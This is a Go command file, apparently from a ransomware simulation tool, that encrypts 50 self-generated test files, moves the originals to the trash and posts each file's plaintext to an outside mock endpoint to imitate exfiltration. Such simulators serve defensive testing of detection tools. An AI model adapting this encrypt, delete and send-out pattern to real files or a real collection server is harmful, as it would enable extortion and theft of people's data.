package cmd

import (
	"github.com/spf13/cobra"
	"fmt"
	"github.com/laurent22/go-trash"
)

var StrongCryptorNetCmd = &cobra.Command{
	Use:   "strong-cryptor-net",
	Short: "Encrypts data, clears original files and simulates an HTTP connection",
	Long:  `Encrypts data, clears original files and simulates an HTTP connection`,
	RunE: func(cmd *cobra.Command, args []string) error {

		var folder = "StrongCryptorNetTest"
		var key = generate_rsa_key()
		var url = "http://mockbin.com/openransim"

		create_folder(folder)
		create_files(folder, 50)
		files := get_files(folder)
		for _, file := range files {
			file_name := fmt.Sprintf(pwd+"/%s/%s", folder, file.Name())
			text, err := read_from_file(file_name)
			check(err)
			ciphertext := encrypt(string(text), key)
			write_to_file(ciphertext, file_name+".copy")
			_, err = trash.MoveToTrash(file_name)
			check(err)
			post(url, string(text))
		}
		return nil
	},
}
